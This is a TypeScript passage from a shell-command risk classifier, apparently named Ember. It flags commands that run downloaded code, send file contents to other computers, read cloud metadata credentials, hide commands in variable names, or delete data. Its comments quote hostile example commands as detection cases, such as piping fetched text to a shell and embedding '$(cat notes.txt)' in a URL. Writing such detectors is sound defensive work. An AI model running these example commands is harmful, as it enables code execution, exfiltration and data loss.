    this.noteProgram(prog);
    this.assignments(assigns, sc, nameArg.v);
    if (nonAsciiLetters(nameArg.v)) this.unclear("unclear.program-letters", "Its program name has letters from another alphabet.");
    // As simple() checks a program's name and a Windows program's arguments: `then`, `do` and `time` run it as if it
    // stood first (commands-remote-c1-1).
    // eslint-disable-next-line no-control-regex -- control characters are exactly what is looked for here
    if (/[\x00-\x1f\x7f]/.test(nameArg.v)) this.unclear("unclear.program", "It runs a program Ember can't name.");
    if (pn.interop) {
      this.windowsReach = true;
      if (words.slice(1).some(a => a.v !== null && (a.v.includes("\t") || a.v.includes("\"") || (a.v.endsWith("\\") && a.v.length > 1)))) {
        this.unclear("unclear.interop-args", "Windows would get different arguments than this shows.");
      }
    }
    // The shell's scope stays the one the command's redirections are opened in, whatever folder the wrapper moves
    // into (`env -C src patch -p1 < x.patch`, `sudo -D src …`: commands-y6-4).
    const versioned = !NATIVE[key] && NATIVE[unversioned(key)] ? key : null;
    if (versioned !== null) key = unversioned(key);
    const inner: H = { e: this, sc, s: { ...h.s, ps: undefined }, key, prog, nameArg, args: words.slice(1), pn, shellSc: h.shellSc ?? h.sc };
    // Native rows only: a wrapper runs a program, never a cmdlet or a cmd built-in.
    if (pn.isPath) {
      this.usePath(nameArg, "exec", sc);
      if (this.isDownloaded(nameArg, sc)) this.add("escape", "escape.run-downloaded", SAYS.runsDownloaded);
      if (!this.onRecord(nameArg, sc)) {
        // `env ./x.sh`, `exec ./x.sh`, `timeout 5 ./x.sh` run the script as `./x.sh` does (L8, the lead's ruling).
        this.scriptByPath(nameArg, pn, sc);
        if (pn.ext === ".bat" || pn.ext === ".cmd") this.recordScript(nameArg, "cmd", sc);
      }
      scriptName(inner, nameArg.v);
      if (!NATIVE[key]) scriptVerbs(inner, nameArg.v, inner.args);
    } else if (this.holdsAnyDownload() && this.isDownloaded(nameArg, sc, false)) {
      // As in dispatch(): a handed bare word that is a download of this task.
      this.add("escape", "escape.run-downloaded", SAYS.runsDownloaded);
    }
    terminalDriver(inner);
    const n = NATIVE[key];
    const dlBefore = this.downloads.length;
    const from = this.findings.length;
    if (n) { this.runRow(n, inner); this.verbGuard(inner, from); }
    else { unknownProgram(inner); generic(inner, true); }
    if (versioned !== null) generic({ ...inner, key: versioned }, true);
    toolPayload(inner);
    optionPaths(inner, !n || UNKNOWN_OPTIONS.has(key));
    this.unnamedWrites(key, inner.args, sc);
    this.afterArgs(inner.args, key);
    // The command's own redirections are this program's (`then curl … > x.py`, `time curl … > x.py`): what it fetches
    // there is a download, and a pipe after it carries what it fetched (commands-remote-c1-1).
    this.afterRun(key, inner.args, h.s, sc, h.shellSc ?? h.sc, dlBefore);
    this.innerMarks = this.downloads.length;
    if (fetches(key) || DECODERS.has(key)) this.pipe.fetch = true;
    // `command printf -v …` and `time unset …` run the same built-ins.
    this.hiddenNames(key, inner.args, sc);
  }

  /**
   * A variable's name with a subscript that runs a command, written out (`printf -v 'a[$(…)]'`, `unset 'a[$(…)]'`,
   * `test -v …`) or out of Ember's sight (`printf -v "$x"`, `read "$x"`, `declare "$x"=1`; `unseenName`).
   */
  hiddenNames(key: string, args: readonly Arg[], sc: Scope): void {
    if (sc.family !== "posix" || !NAME_TAKERS.has(key)) return;
    if (args.some(a => a.v !== null && /\[[^\]]*[$`]/.test(a.v)) || unseenName(key, args)) {
      this.unclear("unclear.hidden-command", "It hides a command in a variable's name.");
    }
    // Setting PATH, PWD and the like by name is an assignment too (`printf -v PATH /tmp/x; ls`, `read PWD <<< …`).
    if (setsRiskyName(key, args)) this.unclear("unclear.assignment", "It changes how commands are found or run.");
    if (key === "printf") this.printfVar(args, sc);
  }

  /** `printf -v d %s ~/.config/ember` gives d the text printf makes, as an assignment does (commands-remote-v4-4). */
  private printfVar(args: readonly Arg[], sc: Scope): void {
    let k = 0;
    let name: string | null = null;
    for (; k < args.length; k++) {
      const v = args[k].v;
      if (v === "--") { k++; break; }
      if (v === null || !v.startsWith("-") || v === "-") break;
      if (v === "-v") { name = args[k + 1]?.v ?? null; k++; } else if (v.startsWith("-v")) name = v.slice(2);
    }
    if (name === null) return;
    const fmt = args[k];
    const rest = args.slice(k + 1);
    if (!fmt) return;
    // Plain text and `%s` (printf uses the format again while words remain): the text it makes. Otherwise each word
    // may be what it makes.
    if (fmt.v !== null && !fmt.glob && !/\\|%(?![s%])/.test(fmt.v) && rest.every(a => a.v !== null && !a.glob)) {
      const n = (fmt.v.match(/%s/g) ?? []).length;
      let out = "";
      let j = 0;
      do out += fmt.v.replace(/%%|%s/g, m => (m === "%%" ? "%" : rest[j++]?.v ?? "")); while (n > 0 && j < rest.length);
      this.setVar(name, [lit(out)], sc);
      return;
    }
    this.setVar(name, [fmt, ...rest], sc);
  }

  /**
   * What every program gets after its row (§3.4.7): output a download writes to a file is a download too
   * (`curl URL > x.sh`, `curl URL | tee x.sh`), and a build tool, test runner or package manager working in a folder
   * this task downloaded runs that folder's code (a cloned repository's Makefile or package scripts).
   */
  afterRun(key: string, args: Arg[], s: Simple, sc: Scope, shellSc: Scope = sc, dlBefore = this.downloads.length): void {
    this.sendsContents(key, args, s);
    // What reads a download writes it out again (`cat x.py > y.py`, `sed … x.py > y.py`, `cat x.py | tee y.py`): the
    // new file is the download too (commands-remote-c2-2). Its redirections are the shell's, opened in its folder
    // whatever folder a wrapper moves the program into (`env -C src curl … > x.py`: commands-z6-3).
    const known = this.ctx.downloaded.size > 0 || this.downloads.length > 0;
    const carried = known && (this.pipe.carried === true || args.some(a => !isOption(a) && this.isDownloaded(a, sc)) || s.redirs.some(r => r.kind === "read" && r.target !== null && this.isDownloaded(r.target, shellSc)));
    if (carried) this.pipe.carried = true;
    // Fetched text that echo, printf or cat prints on (`x=$(curl …); echo "$x" > a.py`, `… | tee a.py`) is the download
    // still (commands-remote-c7-3). Whatever program is given fetched text, the file it writes its output to is one
    // too (`sed … <<< "$x" > a.py`, `tee a.py <<< "$x"`, `dd of=a.py <<< "$x"`: commands-remote-x7-8).
    const prints = s.fetched === true && PRINTS_TEXT.has(key);
    if (prints) this.pipe.fetch = true;
    if (prints || carried || fetches(key)) this.gaveFetched = true;
    const ownStart = this.downloads.length;
    // Fetched text handed to a copier as its input file, by the pipe's own name or a process substitution (`curl … |
    // install -m755 /dev/stdin a.sh`, `cp <(curl …) a.sh`): what it writes is the download (commands-remote-r9-6).
    if (/^(cp|install|ginstall|gcp|rsync|mv|ln|copy-item)$/.test(key) && ((s.fetchBefore && args.some(a => a.v !== null && PIPE_INPUT.test(a.v))) || args.some(a => a.fetch === true))) {
      for (const a of args) if (a.v !== null && a.fetch !== true && !isOption(a) && !PIPE_INPUT.test(a.v) && !NULL_SINKS.has(a.v.toLowerCase())) this.download(a.v, sc);
    }
    if (s.fetchBefore || fetches(key) || carried || s.fetched === true) {
      for (const r of s.redirs) if ((r.kind === "write" || r.kind === "append") && r.target?.v) this.download(r.target.v, shellSc);
      if (/^(tee|tee-object|out-file|set-content|add-content|sponge)$/.test(key)) {
        for (const a of args) if (a.v !== null && a.param === undefined && !isOption(a) && !NULL_SINKS.has(a.v.toLowerCase())) this.download(a.v, sc);
      }
      if (key === "dd") for (const a of args) { const m = a.v === null ? null : /^of=(.+)$/.exec(a.v); if (m && !NULL_SINKS.has(m[1].toLowerCase())) this.download(m[1], sc); }
    }
    const ownEnd = this.downloads.length;
    // A compiler builds a program from a downloaded source: the file it writes is the download too, so running it later
    // asks (commands-remote-r8-2). Carried to `-o`/`-oX` (gcc, rustc), else the default output: `a.out` for a cc-family
    // link, `<stem>.o` per source with `-c`, `<stem>` for rustc. The source operand itself already asks on its own row.
    if (known && COMPILERS.has(key)) this.carryCompiled(key, args, sc);
    // A runner Ember has no download check for (a VM or interpreter whose file operand isn't a shell script) runs a
    // download with no question: java, mono, wine, pwsh on a POSIX shell, jupyter nbconvert --execute
    // (commands-remote-r8-2).
    if (known && this.runsDownloadedExec(key, args, sc)) this.add("escape", "escape.run-downloaded", SAYS.runsDownloaded);
    const runner = PROJECT_RUNNERS.has(key) || ((key === "docker" || key === "podman") && /^(compose|build|buildx)$/.test(args[0]?.v ?? ""));
    // Any other program named with a download; a build tool's own check below reads its words the same way.
    if (!runner) this.runsNamedDownload(key, args, sc, dlBefore);
    // Whether anything is downloaded is read after the row's own redirections are marked, as on 4d64d3a, so a runner
    // given fetched text whose output file is its own argument asks with nothing downloaded before it too
    // (`curl … | make x > x`: commands-remote-y8-2).
    if (!runner || (!known && ownEnd === ownStart)) return;
    const extra = TOOL_PROJECT_FILES[key];
    const folderOf = (v: string): string | null => (sc.cwd ? resolveTargetPath(v, { os: sc.os, home: sc.home ?? "", cwd: sc.cwd }) : null);
    // Downloads this very command saved (`pip download -d build …`, which is both a fetch and a PROJECT_RUNNER, or a
    // compiler's output) are for later commands, not a download this command runs: they don't trip its own check. So the
    // runner check reads only the downloads that stood before this command (commands-remote-r8-2), and those a command
    // it ran made (`poetry run git clone URL sub`, which asked on main: commands-remote-x8-2). The files its own
    // redirections wrote from fetched or carried text are read too, as on 4d64d3a and 848a566, so `curl … | make x > x`
    // and `curl … | make > Makefile` ask (commands-remote-y8-1, y8-3).
    const saved = this.downloads;
    const cut = Math.max(dlBefore, this.innerMarks);
    if (this.downloads.length > cut) this.downloads = this.downloads.slice(0, cut);
    const anyBefore = this.ctx.downloaded.size > 0 || this.downloads.length > 0;
    this.downloads = [...this.downloads, ...saved.slice(Math.max(cut, ownStart), ownEnd)];
    // Every check is made, not only up to the first that holds: one of them may find a download saved by name, which
    // the card then says as a fact (`namedHit`: commands-remote-x7-4).
    const hits = [this.isDownloaded(lit("."), sc), ...args.map(a => {
      if (a.v === null || URL_LIKE.test(a.v)) return false;
      // A download named inside the word: an attached value, a variable's value (commands-remote-r9-5).
      if (this.namesDownload(a.v, sc)) return true;
      const v = a.v.replace(/^--?[A-Za-z][A-Za-z-]*=/, "");
      if (v === "" || v.startsWith("-")) return false;
      // A file it is given, or a folder it works in (`make -C sub`) holding a project file this task downloaded.
      const f = folderOf(v);
      const file = this.isDownloaded({ ...a, v }, sc, false);
      const project = f !== null && this.downloadedProjectFile(f, sc, extra);
      return file || project;
    }), sc.cwd !== null && this.downloadedProjectFile(sc.cwd, sc, extra),
    // In a folder Ember can't name (after `cd x;`, `cd x || exit`, `pushd x` or a cd on its own line, any of which may
    // have failed), the folder may be the download's: a clone entered that way is built there (commands-remote-r8-1).
    sc.cwd === null && anyBefore];
    this.downloads = saved;
    if (hits.some(Boolean)) this.add("escape", "escape.run-downloaded", SAYS.runsDownloaded);
  }

  /**
   * A compiler's output is a download when it builds a downloaded source (commands-remote-r8-2): carried to `-o`/`-oX`,
   * else the default output. Only operands Ember sees as downloaded count as sources.
   */
  private carryCompiled(key: string, args: Arg[], sc: Scope): void {
    const isRust = key === "rustc";
    const out: string[] = [];
    let compileOnly = false;
    const sources: string[] = [];
    for (let k = 0; k < args.length; k++) {
      const a = args[k];
      if (a.v === null) continue;
      if (a.v === "-c" || a.v === "--compile") { compileOnly = true; continue; }
      if (/^(-o|--output|--out|-d|--out-dir|-outdir|-odir)$/.test(a.v)) { if (args[k + 1]?.v) out.push(args[k + 1].v as string); k++; continue; }
      const attached = /^--(?:output|out|out-dir)[=:](.+)$/.exec(a.v) ?? /^[-/](?:out|o|Fe|of)[:=](.+)$/.exec(a.v) ?? /^-o(.+)$/.exec(a.v);
      if (attached) { out.push(attached[1]); continue; }
      if (!a.v.startsWith("-") && this.isDownloaded(a, sc)) sources.push(a.v);
    }
    if (sources.length === 0) return;
    for (const o of out) this.carryDownload(o, sc);
    if (out.length > 0) return;
    if (isRust) { for (const s of sources) { const stem = baseName(s, sc.path.flavour).replace(/\.[^.]+$/, ""); if (stem) this.carryDownload(stem, sc); } return; }
    if (compileOnly) { for (const s of sources) this.carryDownload(s.replace(/\.[^./\\]+$/, ".o"), sc); return; }
    // A cc-family link writes a.out; the others name their output after the source, beside it or here.
    if (/^(gcc|g\+\+|cc|c\+\+|clang|clang\+\+|gfortran|tcc|ld|gold|lld)$/.test(key)) { this.carryDownload("a.out", sc); return; }
    for (const s of sources) { const stem = s.replace(/\.[^./\\]+$/, ""); if (stem) { this.carryDownload(stem, sc); this.carryDownload(baseName(stem, sc.path.flavour), sc); } }
  }

  /**
   * Whether a runner Ember knows runs a file this task downloaded (commands-remote-r8-2): java's `-jar`, class-path
   * entries and main class or source, mono's and wine's executable, PowerShell's `.ps1` on a POSIX shell, and jupyter's
   * notebook. Each operand is checked against the downloads only (never `holdsDownload`, so `java -cp . Main` doesn't ask
   * for an unrelated download). A bare name a runner resolves is tried with the extensions it adds.
   */
  private runsDownloadedExec(key: string, args: Arg[], sc: Scope): boolean {
    const win = sc.path.flavour === "win32";
    const hit = (name: string, exts: readonly string[] = []): boolean =>
      this.isDownloaded(lit(name), sc) || exts.some(e => this.isDownloaded(lit(name + e), sc));
    if (key === "java") {
      let main: string | null = null;
      const cp: string[] = [];
      for (let k = 0; k < args.length; k++) {
        const v = args[k].v;
        if (v === null) continue;
        if (v === "-jar") { const j = args[k + 1]?.v; if (j && hit(j)) return true; k++; continue; }
        if (/^-(cp|classpath|p)$/.test(v) || v === "--class-path" || v === "--module-path") { if (args[k + 1]?.v) cp.push(args[k + 1].v as string); k++; continue; }
        const m = /^--(?:class-path|module-path)=(.+)$/.exec(v) ?? /^-(?:cp|classpath|p)(.+)$/.exec(v);
        if (m) { cp.push(m[1]); continue; }
        const agent = /^-(?:javaagent|agentpath):([^=]+)/.exec(v);
        if (agent) { if (hit(agent[1])) return true; continue; }
        if (v === "--source" || v === "--release") { k++; continue; }
        if (v.startsWith("-")) continue;
        // A source or jar given anywhere (`java --source 21 X.java`) runs, so every file operand is checked, and the
        // first bare word is also tried as a main class (commands-remote-r8-2).
        if (/\.(jar|java|class)$/i.test(v)) { if (hit(v)) return true; continue; }
        if (main === null) main = v;
      }
      for (const entry of cp.flatMap(c => c.split(win ? ";" : ":"))) if (entry && entry !== "." && hit(entry)) return true;
      if (main !== null) return hit(`${main.replace(/\./g, "/")}.class`) || hit(`${main.replace(/\./g, "/")}.java`);
      return false;
    }
    if (key === "mono" || key === "wine" || key === "wine64") {
      const op = args.find(a => a.v !== null && !a.v.startsWith("-"));
      return op?.v != null && hit(op.v);
    }
    if ((key === "pwsh" || key === "powershell" || key === "pwsh-preview") && !win) {
      // On a POSIX shell these run a .ps1; on Windows the PowerShell row records the script itself.
      for (let k = 0; k < args.length; k++) {
        const v = args[k].v;
        if (v !== null && /^-(f|fi|fil|file)$/i.test(v)) { const f = args[k + 1]?.v; return f != null && hit(f); }
        if (v !== null && !v.startsWith("-") && /\.ps1$/i.test(v)) return hit(v);
      }
      return false;
    }
    if (key === "jupyter") {
      if (args[0]?.v === "nbconvert" && args.some(a => a.v === "--execute")) {
        return args.slice(1).some(a => a.v !== null && !a.v.startsWith("-") && hit(a.v));
      }
      if (args[0]?.v === "run" && args[1]?.v) return hit(args[1].v);
      return false;
    }
    return false;
  }

  /**
   * Whether a word names a file this task downloaded, or a folder that holds one of its project files, anywhere in
   * it (commands-remote-r9-5): the word itself; the value attached to an option (`-Cr`, `-fr/pom.xml`,
   * `--file=r/x`, `/c:x`); the value of a `NAME=value` or a `-DNAME=value`; each part of a list or of quoted words
   * (`'project r'`, `a,b`, `'key="./x.sh"'`); a response file after `@`; a build label's folder (`//r/...`).
   */
  namesDownload(word: string, sc: Scope): boolean {
    if (!sc.cwd || URL_LIKE.test(word)) return false;
    const win = sc.path.flavour === "win32";
    const at = { os: sc.os, home: sc.home ?? "", cwd: sc.cwd };
    const seen = new Set<string>();
    const hit = (c0: string): boolean => {
      // A response file (`gcc @opts`, `javac @args`, `java @fix`): its lines are the program's own options, a wrapper
      // or a plugin among them, whatever the file is called (commands-classes-x9-2).
      const response = /^@[^@({]/.test(c0);
      const c = response ? c0.slice(1) : c0;
      const t = c.replace(/^\/\/(?=[^/])/, "").replace(/\/\.\.\.$|(?<=.):[A-Za-z0-9_.-]*$/, m => (win && m.length > 1 ? m : ""));
      if (t === "" || t.startsWith("-") || seen.has(t) || URL_LIKE.test(t)) return false;
      seen.add(t);
      // A file whose name says plain data (a table, text, a picture, a document) isn't code a program runs: it leaves
      // the command as it was (commands-remote-c2-2), unless a build tool follows it by name (PROJECT_FILE).
      const base = baseName(t.replace(/[\\/]+$/, ""), sc.path.flavour);
      if (!response && DATA_FILE.test(base) && !PROJECT_FILE.test(base)) return false;
      return this.isDownloaded(lit(t), sc, false) || this.downloadedProjectFile(resolveTargetPath(t, at), sc);
    };
    // Also what stands in quotes or brackets inside the word, as a tool's own settings are written
    // (`--config 'build.rustc-wrapper="./cc.sh"'`, `'runner = ["./run.sh"]'`).
    const parts = (text: string): string[] => [text, ...text.split(win ? /[\s=,;"'`()[\]{}]+/ : /[\s=,;:"'`()[\]{}]+/)];
    const texts = [word];
    // A short option with its value attached, a long one after `=`, and cmd's `/x:value`.
    const short = /^-[A-Za-z](.+)$/.exec(word);
    if (short) texts.push(short[1]);
    const slash = /^\/[A-Za-z?]+:(.+)$/.exec(word);
    if (slash) texts.push(slash[1]);
    return texts.some(t => parts(t).some(hit));
  }

  /**
   * A program that isn't one that only reads or moves files (DOWNLOAD_READERS), named with a download of this task
   * anywhere on its line, or working in a downloaded folder or one Ember can't name (commands-remote-r9-5, r9-6): it
   * may run the download, whatever program it is, so it asks. Only what stood downloaded before this command counts,
   * as for the build tools' own check below, and a wrapper's command is judged as its own program.
   */
  private runsNamedDownload(key: string, args: readonly Arg[], sc: Scope, dlBefore: number): void {
    // A shell or a program given its command as text judges that text as commands of their own (nested()).
    if (this.asMain || NESTS_TEXT.has(key) || key === "") return;
    // A reader or a fetch tool stays one unless a word of its line makes it run or load a file (READER_RUNS).
    const runs = READER_RUNS[key];
    const reader = DOWNLOAD_READERS.has(key) || fetches(key);
    if (reader && !(runs !== undefined && args.some(a => a.v !== null && runs.test(a.v)))) return;
    const saved = this.downloads;
    const cut = Math.max(dlBefore, this.innerMarks);
    if (this.downloads.length > cut) this.downloads = this.downloads.slice(0, cut);
    try {
      if (this.ctx.downloaded.size === 0 && this.downloads.length === 0) return;
      // A wrapper's command is judged as its own program, in the folder the wrapper gives it: of a wrapper with a row
      // only the variables it sets for the command count (`env CC=./cc.sh make`; never `env -C src patch …`).
      const { own: all, wraps } = this.ownWords(args);
      let own = all;
      if (wraps && NATIVE[key]) own = own.filter(a => a.v !== null && /^[A-Za-z_][A-Za-z0-9_]*=/.test(a.v));
      // Such a reader given a word Ember can't read (`-pre SO_PATH:$PWD/fix.so`) may be given the download too.
      const hit = own.some(a => (a.v !== null ? this.namesDownload(a.v, sc) : reader))
        || (!wraps && !reader && (sc.cwd === null || this.isDownloaded(lit("."), sc, false)));
      if (hit) this.add("escape", "escape.run-downloaded", SAYS.runsDownloaded);
    } finally {
      this.downloads = saved;
    }
  }

  /**
   * A program that sends (a fetch tool: curl, wget, httpie, Invoke-WebRequest, nc and their like) given what a file
   * or a command holds inside its address, a header, a cookie, a sign-in or a field (commands-remote-r9-7): a command
   * or process substitution, backticks, `$(<file)`, a variable this line filled from a command or a read, curl's
   * `-H @file`, or a file on httpie's input. The contents leave the computer, so it asks as publishing. Never a
   * substitution that only says the machine's kind, the time, a version or what another fetch returned
   * (`$(uname -m)`, `$(date +%s)`, `$(curl …/latest)`), nor a variable the line didn't fill.
   */
  private sendsContents(key: string, args: readonly Arg[], s: Simple): void {
    if (this.asMain) return;
    const says = "May send what a file or a command holds to another computer.";
    if (!FETCHERS.has(key)) {
      // Any other program given a web address that holds what a command or a read gave sends it as well (`git
      // ls-remote "https://x.io/$(cat notes.txt)"`, `pip download …`: commands-classes-y9-6).
      const { own: words } = this.ownWords(args);
      if (words.some(a => a.v === null && /^["']?(https?|ftps?|ssh|git):\/\//i.test(a.raw) && substituted(a.raw).some(inner => !saysLittle(inner)))) this.add("publish", "send.contents", says);
      return;
    }
    // The address a cloud computer hands out its own sign-in at (the instance metadata service): what a fetch of it
    // prints is a credential (commands-remote-r9-9).
    if (args.some(a => a.v !== null && cloudMetadata(a.v))) this.add("secret", "secret.cloud", SAYS.secrets);
    // A PowerShell variable the line filled from a command counts as a POSIX one does (commands-classes-y9-6).
    const filled = (name: string): boolean => (this.varValues.get(name) ?? []).some(f => f.includes(UNSEEN)) || this.loopVars.get(name) === "read"
      || (this.psVarValues.get(name.toLowerCase().replace(/^(script|global|local|private|using):/, "")) ?? []).some(f => f.includes(UNSEEN));
    let hit = /^(http|https|xh|xhs)$/.test(key) && s.stdin === "file";
    const { own } = this.ownWords(args);
    for (let k = 0; k < args.length && !hit; k++) {
      const a = args[k];
      if (!own.includes(a)) continue;
      // curl reads a header's lines from a file (`-H @file`), and a variable's value (`--variable name@file`:
      // commands-classes-y9-6).
      if (a.v !== null) {
        hit = /^curl/.test(key) && ((/^(-H|--header|--proxy-header)$/.test(args[k - 1]?.v ?? "") && /^@./.test(a.v)) || (args[k - 1]?.v === "--variable" && /^[^=@]+@./.test(a.v)) || /^--variable=[^=@]+@./.test(a.v));
        continue;
      }
      if (a.parts?.some(p => typeof p !== "string" && p.name !== null && filled(p.name))) { hit = true; continue; }
      hit = substituted(a.raw).some(inner => !saysLittle(inner));
    }
    if (hit) this.add("publish", "send.contents", says);
  }

  /** Whether this task holds any download, named or not: an earlier command's, or one earlier on this line. */
  holdsAnyDownload(): boolean {
    return this.ctx.downloaded.size > 0 || this.downloads.length > 0;
  }

  /** Classifies a nested shell text (sh -c, cmd /c, powershell -Command) in a child scope. */
  nested(text: string, shell: ShellId, sc: Scope, wrapper: string, o: Partial<Scope> = {}, stdin: { fetch: boolean } | null = null): void {
    const savedAt = this.at;
    const savedProg = this.program;
    const savedPipe = this.pipe;
    const savedCd = this.cdTarget;
    const before = this.commands.length;
    this.classifyText(text, shell, child(sc, { ...o, wrappers: [...sc.wrappers, wrapper], depth: sc.depth + 1 }, { pipedIn: stdin }));
    this.at = savedAt;
    this.program = savedProg;
    this.pipe = savedPipe;
    this.cdTarget = savedCd;
    // What the wrapped text fetches comes out of the wrapper (`wsl curl … | sh`).
    if (this.commands.slice(before).some(c => FETCHERS.has(c.program.toLowerCase()) || DECODERS.has(c.program.toLowerCase()))) this.pipe.fetch = true;
  }
}

// ------------------------------------------------------------------------------------------------------------------
// Handler helpers.

const opts = (h: H, spec: OptSpec = {}): Parsed => parseOpts(h.args, spec);

/** Whether two option tables read a line alike: the same options with the same values at the same words, the same operands. */
function sameParse(a: Parsed, b: Parsed): boolean {
  return a.restAt === b.restAt && a.missingValue === b.missingValue && a.opts.length === b.opts.length && a.operands.length === b.operands.length
    && a.opts.every((o, k) => o.name === b.opts[k].name && o.value === b.opts[k].value && o.at === b.opts[k].at)
    && a.operands.every((w, k) => w === b.operands[k]);
}

/** Whether two findings say the same thing of the same objects, with nothing more for an intent row to refuse in one. */
function sameFinding(a: Finding, b: Finding): boolean {
  return a.cls === b.cls && a.rule === b.rule && a.says === b.says && a.ifExists === b.ifExists && a.program === b.program
    && a.widening.length === b.widening.length && a.widening.every(w => b.widening.includes(w))
    && a.objects.length === b.objects.length && a.objects.every((o, k) => o.kind === b.objects[k].kind && o.text === b.objects[k].text && o.resolved === b.objects[k].resolved);
}

/**
 * A row's options, read by its own table and held to main's (`was`: the table as it stood at 4d64d3a, read by today's
 * parser, so a job count is still a count): where the two read the line differently, Engine.runRow judges the row
 * main's way too, so no way of writing an option decides less safely than it did there (commands-held, as xargs since
 * commands-remote-x7-5). Give every table that changes one: the options as they were, copied, never corrected.
 */
function heldOpts(h: H, now: OptSpec, was: OptSpec, args: readonly Arg[] = h.args, wasArgs: readonly Arg[] = args): Parsed {
  return h.e.parseHeld(args, now, was, wasArgs);
}
const objsOf = (h: H, list: Arg[], use: PathUse): Obj[] => list.map(a => h.e.usePath(a, use, h.sc));
/** Objects for the card: as written; an unresolved one by its text. */
/**
 * A finding's words with each of its objects that is a dot folder said as shownPath says it, wherever it stands as a
 * word of its own ("under .." is "under" and "." and the full stop), find's `{}` as each file it finds, a loop's
 * variable as the files the loop names (commands-remote-c2-3), and a path in `home` (a POSIX shell's home folder) from
 * ~ ("~/Documents/report.pdf", commands-remote-r2-3). Only the words change: the objects, their paths and the matching
 * stay as written.
 */
function cardWords(says: string, objects: readonly Obj[], wrappers: readonly string[], start: string | null = null, os: OS = "linux", home: string | null = null, loops: ReadonlyMap<string, "for" | "read" | readonly string[]> = new Map()): string {
  let out = says;
  for (const text of new Set(objects.map(o => o.text))) {
    let shown = shownPath(text);
    // `"$f"` alone, f a loop's variable: the names in its list, each file the loop names, or each one listed in what it
    // reads. Several names are "them" (commands-remote-c2-3: "Deletes ~/Documents and ~/Pictures and everything in them.").
    const v = /^"?\$(?:\{([A-Za-z_]\w*)\}|([A-Za-z_]\w*))"?$/.exec(text);
    const loop = v ? loops.get(v[1] ?? v[2]) : undefined;
    if (typeof loop === "object") {
      shown = joinList(loop.map(shownPath));
      if (loop.length > 1) out = out.replace(/ and everything in it\./, " and everything in them.").replace(/ if it exists\./, " if they exist.");
    } else if (loop) shown = loop === "for" ? "each file the loop names" : "each file listed in its input";
    if (shown === text) continue;
    // After a cd in the same command (`cd ~ && git checkout .`), a dot folder isn't the one the card says the command
    // starts in: it is named (commands-remote-v1).
    const abs = objects.find(o => o.text === text)?.abs ?? null;
    if (abs !== null && start !== null && /^\.\.?[\\/]*$/.test(text)) shown = folderWords(abs, start, os);
    const esc = text.replace(/[.*+?^${}()|[\]\\/]/g, c => `\\${c}`);
    out = out.replace(new RegExp(`(^|[\\s(])${esc}(?=[\\s,;:)]|\\.?$)`, "g"), (_m, pre: string) => `${pre}${shown}`);
  }
  if (objects.some(o => o.text === "{}") && wrappers.some(w => /^find -(exec|execdir|ok|okdir)$/.test(w))) {
    out = out.replace(/(^|[\s(])\{\}(?=[\s,;:)]|\.?$)/g, (_m, pre: string) => `${pre}each file it finds`);
  }
  const h = home?.replace(/\/+$/, "") ?? "";
  if (h.startsWith("/") && h.length > 1) {
    const esc = h.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
    out = out.replace(new RegExp(`(^|[\\s(])${esc}(?=/|[\\s,;:)]|\\.?$)`, "g"), "$1~");
  }
  return out;
}

/**
 * A folder as the card says it (commands-remote-v1): the one the card's header names (the start folder) as `here`,
 * the one above it as such, any other by its path. After a cd in the same command, the folder a command works in
 * isn't the one the header names, so "the current folder" would name the wrong one.
 */
function folderWords(abs: string, start: string, os: OS, here = "the current folder"): string {
  const P = os === "win32" ? win32 : posix;
  const trim = (p: string) => (p.length > 1 ? p.replace(/[\\/]+$/, "") : p);
  const at = trim(start);
  return trim(abs) === at ? here : trim(abs) === P.dirname(at) ? "the folder above the current one" : trim(abs);
}
/** The folder a command works in when it names none (`tar x`, `unzip`): "this folder" while it is the start folder. */
const thisFolder = (h: H, into: Obj): string => (into.abs === null || !h.e.ctx.cwd ? "this folder" : folderWords(into.abs, h.e.ctx.cwd, h.sc.os, "this folder"));

const listOf = (objs: Obj[], fallback = "files Ember can't name"): string => (objs.length ? joinList(objs.map(o => o.text || fallback)) : fallback);
/** A bare `*` (`./*`, `build/*`): everything in a folder. */
const STAR = /^(?:(.*?)[\\/]+)?\*$/;
/**
 * `rm -rf *` said as what it deletes: "Deletes everything in the current folder." (without -r, the files in it), not
 * "Deletes * and everything in it." (commands-remote-r1); after a cd, the folder it changed to by its path
 * (commands-remote-v1). Null when an operand is anything else.
 */
function starDeletes(h: H, objs: readonly Obj[], rec: boolean): string | null {
  if (!objs.length || objs.some(o => !STAR.test(o.text))) return null;
  const start = h.e.ctx.cwd || null;
  const where = joinList([...new Set(objs.map(o => {
    const d = STAR.exec(o.text)?.[1];
    // `/*` is the top folder, never the current one.
    if (d === "" && /^[\\/]/.test(o.text)) return o.text.slice(0, 1);
    const dot = d === undefined || d === "" || /^\.\.?([\\/]+\.\.?)*$/.test(d);
    if (!dot) return d;
    const P = h.sc.os === "win32" ? win32 : posix;
    // After `cd $X` the folder isn't known: the card's next line says so.
    if (o.abs === null && h.sc.cwd === null) return "a folder Ember can't name";
    return o.abs !== null && start !== null ? folderWords(P.dirname(o.abs), start, h.sc.os) : shownPath(d === undefined || d === "" ? "." : d);
  }))]);
  return rec ? `Deletes everything in ${where}.` : `Deletes the files in ${where}.`;
}
const lower = (a: Arg | undefined): string | null => (a && a.v !== null ? a.v.toLowerCase() : null);

/** The words of a script, target or package-script name (§3.5.9): split on - _ : . / \ and camel case. */
export function nameWords(name: string): string[] {
  return name
    .replace(/([a-z0-9])([A-Z])/g, "$1 $2")
    .split(/[-_:./\\\s]+/)
    .map(w => w.toLowerCase())
    .filter(w => w !== "");
}

/** What a destroying word is written together with in one name (`dropdb`, `resetdb`, `dbreset`, `cleanall`). */
const JOINED_NAME = /^(db|database)(?=.)|(?<=.)(db|database|all|data|tables|schema)$/;
/**
 * A framework's verbs that empty or replace a database without a destroying word in them (commands-classes-x9-8):
 * `migrate:refresh` and `migrate:redo` roll every table back first, `schema:load` and `structure:load` replace the
 * tables with the schema's.
 */
const DB_REPLACES = /(^|[^A-Za-z])migrate[:_-](refresh|redo)($|[^A-Za-z])|(^|[^A-Za-z])(schema|structure)[:_-]load($|[^A-Za-z])/i;
/** Words that empty or replace a database only beside a word for one (`db:empty`, `db:clear`, `cleardb`, `database:recreate`: commands-classes-y9-9). */
const DB_EMPTIES = new Set(["empty", "clear", "remove", "rm", "recreate", "refresh", "zap"]);
/** Whether a name's words say it deletes things. */
function namesDestroy(name: string): boolean {
  const words = nameWords(name);
  if (words.some(w => NAME_DESTROY.has(w) || NAME_DESTROY.has(w.replace(JOINED_NAME, ""))) || DB_REPLACES.test(name)) return true;
